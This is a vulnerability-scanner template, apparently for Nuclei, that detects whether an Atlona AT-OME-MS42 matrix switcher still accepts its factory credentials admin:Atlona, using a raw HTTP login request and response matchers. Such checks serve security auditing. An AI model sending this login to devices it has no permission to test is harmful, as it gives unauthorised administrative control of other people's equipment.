id: atlona-default-login

info:
  name: Atlona AT-OME-MS42 - Default Login
  author: matejsmycka
  severity: high
  description: |
    The Atlona AT-OME-MS42, a 4x2 matrix switcher supporting HDMI, USB-C, and DisplayPort inputs, is accessible via a built-in web management interface. By default, this interface uses the factory-set credentials admin:Atlona. If left unchanged, attackers could gain unauthorized administrative access to the device, potentially allowing them to alter configurations, disrupt AV switching, or pivot further into the network.
  reference:
    - https://atlona.com/pdf/manuals/AT-OME-MS42_G.pdf
  tags: atlona,default-login

http:
  - raw:
      - |
        POST /cgi-bin/login.cgi?ssid={{base64('admin:Atlona')}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic undefined
        X-Requested-With: XMLHttpRequest
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/json
        Cookie: SSID=

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Login Success!")'
          - 'contains(content_type, "application/json")'
          - 'status_code == 200'
        condition: and
# digest: 4a0a00473045022005d4dbfa8952006617dc8ae4478f5d6536404b3fe6ab17f2e86f82a61ced20b1022100a6bda592c2033e52ec8993378e2fa9e8f9baab309810286f9faeaf57572cc665:922c64590222798bb761d5b6d8e72950